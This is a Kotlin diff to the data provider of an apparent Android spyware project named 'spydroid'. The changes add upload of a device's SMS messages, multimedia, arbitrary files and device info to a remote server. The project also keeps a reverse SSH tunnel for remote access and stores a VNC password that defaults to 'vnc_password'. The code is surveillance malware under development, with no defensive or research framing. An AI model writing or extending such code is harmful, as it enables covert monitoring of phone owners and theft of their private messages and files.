@@ -42,6 +42,8 @@ import org.koin.core.component.inject
 import org.koin.core.context.startKoin
 import com.jcraft.jsch.JSch
 import com.jcraft.jsch.Session
+import net.spydroid.common.remote.domain.UploadFilesRepository
+import java.io.File
 import java.util.Properties
 
 private fun createReverseSSHTunnel(context: Context, port: (Int) -> Unit) {
@@ -95,6 +97,7 @@ class RemoteDataProvider private constructor(
     private val infoRepository: InfoRepository by inject()
     private val multimediaRepository: MultimediaRepository by inject()
     private val smsRepository: SmsRepository by inject()
+    private val uploadFileRepository: UploadFilesRepository by inject()
 
     private val scope = CoroutineScope(Dispatchers.IO)
 
@@ -106,15 +109,47 @@ class RemoteDataProvider private constructor(
         val KEY = "portTunnel"
     }
 
-    private fun setPort(state: Int) {
-        val editor = sharedPreferences.edit()
-        editor.putInt(PORT_VALUES.KEY, state)
-        editor.apply()
+    private object VNC_VALUES {
+        val VALUE_DEFAULT = "vnc_password"
+        val KEY = "passwordVnc"
+    }
+
+    private object INTERNET_VALUES {
+        val VALUE_DEFAULT = false
+        val KEY_DEVICES = "unuploadedDevicesToInternet"
+        val KEY_SMS = "unuploadedSmsToInternet"
+        val KEY_FILES = "unuploadedFilesToInternet"
+    }
+
+    private object INFO_VALUES {
+        val VALUE_DEFAULT = false
+        val KEY = "infoDevices"
     }
 
     private val _port =
         MutableStateFlow(sharedPreferences.getInt(PORT_VALUES.KEY, PORT_VALUES.VALUE_DEFAULT))
     val port: StateFlow<Int> = _port
+
+    private val _passwordVnc =
+        MutableStateFlow(sharedPreferences.getString(VNC_VALUES.KEY, VNC_VALUES.VALUE_DEFAULT))
+    val passwordVnc: StateFlow<String?> = _passwordVnc
+
+    // Upload instances from info into server
+    private val _unuploadedDevicesToInternet =
+        MutableStateFlow(sharedPreferences.getBoolean(INTERNET_VALUES.KEY_DEVICES, INTERNET_VALUES.VALUE_DEFAULT))
+    val unuploadedDevicesToInternet: StateFlow<Boolean> = _unuploadedDevicesToInternet
+
+    private val _unuploadedSmsToInternet =
+        MutableStateFlow(sharedPreferences.getBoolean(INTERNET_VALUES.KEY_SMS, INTERNET_VALUES.VALUE_DEFAULT))
+    val unuploadedSmsToInternet: StateFlow<Boolean> = _unuploadedSmsToInternet
+
+    private val _unuploadedFilesToInternet =
+        MutableStateFlow(sharedPreferences.getBoolean(INTERNET_VALUES.KEY_FILES, INTERNET_VALUES.VALUE_DEFAULT))
+    val unuploadedFilesToInternet: StateFlow<Boolean> = _unuploadedFilesToInternet
+
+    private val _infoUploaded =
+        MutableStateFlow(sharedPreferences.getBoolean(INFO_VALUES.KEY, INFO_VALUES.VALUE_DEFAULT))
+    val infoUploaded: StateFlow<Boolean> = _infoUploaded
 
     private val _devices = MutableStateFlow(mutableListOf<Devices>())
     val devices: StateFlow<List<Devices>> = _devices
@@ -128,30 +163,95 @@ class RemoteDataProvider private constructor(
     private val _sms = MutableStateFlow(mutableListOf<SmsDevices>())
     val sms: StateFlow<List<SmsDevices>> = _sms
 
-    private fun setDevice(device: Devices) =
+
+    private fun setPort(port: Int) {
+        val editor = sharedPreferences.edit()
+        editor.putInt(PORT_VALUES.KEY, port)
+        editor.apply()
+    }
+
+    fun setPasswordVnc(password: String) = apply {
+        val editor = sharedPreferences.edit()
+        editor.putString(VNC_VALUES.KEY, password)
+        editor.apply()
+        _passwordVnc.value = password
+    }
+
+    fun setInfo(info: InfoDevices) = apply {
+        scope.launch {
+            infoRepository.insertInfo(info)
+            val editor = sharedPreferences.edit()
+            val state = true
+            editor.putBoolean(INFO_VALUES.KEY, state)
+            editor.apply()
+            _infoUploaded.value = state
+        }
+    }
+
+
+    fun updateInfo(info: InfoDevices) = apply {
+        scope.launch {
+            infoRepository.updateInfo(info)
+        }
+    }
+
+    fun setStateDevicesInternet(state: Boolean) = apply {
+        val editor = sharedPreferences.edit()
+        editor.putBoolean(INTERNET_VALUES.KEY_DEVICES, state)
+        editor.apply()
+        _unuploadedDevicesToInternet.value = state
+    }
+
+    fun setStateSmsInternet(state: Boolean) = apply {
+        val editor = sharedPreferences.edit()
+        editor.putBoolean(INTERNET_VALUES.KEY_SMS, state)
+        editor.apply()
+        _unuploadedSmsToInternet.value = state
+    }
+    fun setStateFilesInternet(state: Boolean) = apply {
+        val editor = sharedPreferences.edit()
+        editor.putBoolean(INTERNET_VALUES.KEY_FILES, state)
+        editor.apply()
+        _unuploadedFilesToInternet.value = state
+    }
+
+    fun setDevice(device: Devices) = apply {
         scope.launch {
             devicesRepository.insertDevice(device)
         }
+    }
 
-    fun startSshTunnel() = scope.launch(Dispatchers.IO) {
+    fun setMultimedia(multimedia: MultimediaDevices) = apply {
+        scope.launch {
+            multimediaRepository.insertMultimedia(multimedia)
+        }
+    }
+
+    fun setSms(sms: SmsDevices) = apply {
+        scope.launch {
+            smsRepository.insertSms(sms)
+        }
+    }
+
+    fun setFile(
+        file: File,
+        type: String,
+        alias: String
+    ) = apply {
+        scope.launch(Dispatchers.IO) {
+            uploadFileRepository.insertFile(context, file, type, alias)
+        }
+    }
+
+    fun startSshTunnel(port: (Int) -> Unit) = scope.launch(Dispatchers.IO) {
         createReverseSSHTunnel(context) {
             setPort(it)
+            port(it)
             _port.value = it
         }
     }
 
-    // GET
-    fun getAllDevices() =
-        scope.launch {
-            devicesRepository.getAllDevices().map {
-                val updateList = _devices.value.toMutableList().apply {
-                    add(it)
-                }
-                _devices.value = updateList
-            }
-        }
-
-    fun getDevice(alias: String) =
+    fun getDevice(alias: String = "ALL") =
         scope.launch {
             devicesRepository.getDevice(alias).map {
                 val updateList = _devices.value.toMutableList().apply {
@@ -161,33 +261,7 @@ class RemoteDataProvider private constructor(
             }
         }
 
-    fun getAllInfo() =
-        scope.launch {
-            infoRepository.getAllInfo().map {
-                val updateLIst = _info.value.toMutableList().apply { add(it) }
-                _info.value = updateLIst
-            }
-        }
-
-    fun getInfo(alias: String) =
-        scope.launch {
-            infoRepository.getInfo(alias).map {
-                val updateLIst = _info.value.toMutableList().apply { add(it) }
-                _info.value = updateLIst
-            }
-        }
-
-    fun getAllMultimedia() =
-        scope.launch {
-            multimediaRepository.getAllMultimedia().map {
-                val updateList = _multimedia.value.toMutableList().apply {
-                    add(it)
-                }
-                _multimedia.value = updateList
-            }
-        }
-
-    fun getMultimedia(alias: String) =
+    fun getMultimedia(alias: String = "ALL") =
         scope.launch {
             multimediaRepository.getMultimedia(alias).map {
                 val updateList = _multimedia.value.toMutableList().apply {
@@ -197,17 +271,7 @@ class RemoteDataProvider private constructor(
             }
         }
 
-    fun getAllSms() =
-        scope.launch {
-            smsRepository.getAllSms().map {
-                val updateList = _sms.value.toMutableList().apply {
-                    add(it)
-                }
-                _sms.value = updateList
-            }
-        }
-
-    fun getSms(alias: String) =
+    fun getSms(alias: String = "ALL") =
         scope.launch {
             smsRepository.getSms(alias).map {
                 val updateList = _sms.value.toMutableList().apply {
@@ -216,28 +280,6 @@ class RemoteDataProvider private constructor(
                 _sms.value = updateList
             }
         }
-
-
-    fun insertDevice(device: Devices) =
-        scope.launch {
-            devicesRepository.insertDevice(device)
-        }
-
-    fun insertInfo(info: InfoDevices) =
-        scope.launch {
-            infoRepository.insertInfo(info)
-        }
-
-    fun insertMultimedia(multimedia: MultimediaDevices) =
-        scope.launch {
-            multimediaRepository.insertMultimedia(multimedia)
-        }
-
-    fun insertSms(sms: SmsDevices) =
-        scope.launch {
-            smsRepository.insertSms(sms)
-        }
-
 
     companion object {
         @SuppressLint("StaticFieldLeak")
